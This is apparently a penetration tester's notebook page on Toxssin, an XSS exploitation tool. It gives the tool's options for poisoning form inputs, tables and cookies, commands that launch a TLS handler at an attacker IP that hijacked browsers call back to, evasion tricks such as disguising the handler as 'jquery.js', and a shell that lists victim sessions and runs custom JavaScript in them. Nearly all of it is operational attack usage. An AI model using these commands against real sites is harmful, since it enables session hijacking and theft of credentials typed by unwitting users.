# [[03 - Offensive Infrastructure/E - Setup Machine/0x03 - Offensive Tools/Webapp Pentesting/XSS/Toxssin|Toxssin]]

```
# toxssin -h
usage: toxssin.py [-h] -u URL -c CERTFILE -k KEYFILE [-p PORT] [-s SCRIPT_NAME] [-e ELEMENTS] [-f FREQUENCY] [-a COOKIE_AGE] [-t] [-g] [-v] [-q]

options:
  -e ELEMENTS, --elements ELEMENTS
                        Html elements to poison (default: input[type='text'], input[type='password'], input[type='date'], input[type='email'],
                        input[type='datetime-local'], input[type='hidden'], input[type='number'], input[type='search'], input[type='url'],
                        input[type='radio'], input[type='checkbox'], select, textarea) *Forms, tables and file inputs are poisoned by default.
  -f FREQUENCY, --frequency FREQUENCY
                        Change html elements poisoning cycle frequency (default: 3000 ms)
  -a COOKIE_AGE, --cookie-age COOKIE_AGE
                        Toxssin cookie max age in days (default: 30)
  -t, --no-tables       Disable html tables spidering
  -g, --grab-poisoned   Identify and re-establish sessions sourcing from cached content (default: False)
```

> [!IMPORTANT] Administrative Privileges is Required
> You have to run this as root. Currently I tested two vulnerable XSS types and they are **DOM-Based XSS** and **Stored XSS**. **Reflective XSS** doesn't work. 

## 01 - Launch Server

```
# openssl req -x509 -newkey rsa:2048 -subj "/C=<country_code>/ST=<state>/L=<locality>/O=<organization_name>/OU=<organization_unit>/CN=<domain.com>/emailAddress=<email>" -keyout private.key -out certificate.crt -days 365
```

Non-encrypted TLS key and certification

```
$ openssl req -new -x509 -subj "/C=<country_code>/ST=<state>/L=<locality>/O=<organization_name>/OU=<organization_unit>/CN=<domain.com>/emailAddress=<email>" -keyout private.key -out certificate.crt -days 365 -nodes
```

Pass the parameters of key and certificate.

```
# toxssin -q -u https://<attacker_IP> -k /absolute/path/to/private.key -c /absolute/path/to/certificate.crt
```

## Evasion

Change the web server port (by default it's 443).

```
# toxssin -q -u https://<attacker_IP>:<PORT> -p <PORT> -k /absolute/path/to/private.key -c /absolute/path/to/certificate.crt
```

Change the javascript name for the handler.

```
# toxssin -q -s jquery.js -u https://<attacker_IP> -k /absolute/path/to/private.key -c /absolute/path/to/certificate.crt
```

## 1.2 - Interactive Shell

```
toxssin > help

  Command                    Description
  -------                    -----------
  help                       Print this message.
  sessions                   Print all victim sessions data.
  active                     Print active session data (the one that is currently printing on stdout).
  activate <sid>             Change the active session by providing the session id.
  flush                      Delete all current sessions (reset).
  exec <JS file path> <sid>  Execute custom JS script against session by id.
  verbose                    Enable/disable verbose mode.
  clear/cls                  Clear screen.
  exit/quit/q                Terminate program.

  *All sessions are logged despite of which one is active.
```